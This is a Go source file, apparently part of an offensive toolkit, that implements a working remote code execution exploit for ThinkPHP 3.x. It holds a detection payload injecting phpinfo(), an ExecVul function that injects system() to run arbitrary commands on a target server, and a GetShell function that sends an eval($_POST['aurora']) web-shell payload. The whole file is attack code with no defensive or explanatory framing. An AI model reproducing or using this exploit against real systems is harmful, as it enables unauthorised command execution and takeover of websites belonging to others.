package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
)

type TP3Module struct {
	BaseUrl            string
	feature            string
	moduleList         []string
	currentModule      string
	checkVulPayloadUrl string
	execVulPayloadUrl  string
	checkStr           string
}

func NewTP3Module(baseUrl string) *TP3Module {
	return &TP3Module{
		BaseUrl:            baseUrl,
		feature:            "ThinkPHP 3.x RCE",
		moduleList:         []string{"manage", "admin", "api"},
		currentModule:      "",
		checkVulPayloadUrl: "/\\think\\module/action/param1/${@phpinfo()}",
		execVulPayloadUrl:  "/\\think\\module/action/param1/{${system($_GET['x'])}}?x=",
		checkStr:           "PHP Version",
	}
}
func (m *TP3Module) CheckVul() *util.Response {
	for _, s := range m.moduleList {
		resp, err := http.Get(m.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			m.currentModule = s
			break
		}
	}
	if m.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	payloadUrl := m.BaseUrl + "/?s=" + m.currentModule + m.checkVulPayloadUrl
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}

	if strings.Contains(string(bytes), m.checkStr) {
		return util.Success("success", m.feature)
	}
	return util.Fail("no vulnerable")

}

func (m *TP3Module) ExecVul(cmd string) *util.Response {
	payloadUrl := m.BaseUrl + "/?s=" + m.currentModule + m.execVulPayloadUrl + cmd
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}
	return util.Success("success", string(bytes))
}

func (m *TP3Module) GetShell() *util.Response {
	sellUrl := m.BaseUrl + "/?s=" + m.currentModule + "/\\think\\module/action/param1/{${eval($_POST['aurora'])}}"
	resp, err := http.Get(sellUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		return util.Success("success", sellUrl)
	}
	return util.Fail("no vulnerable")
}
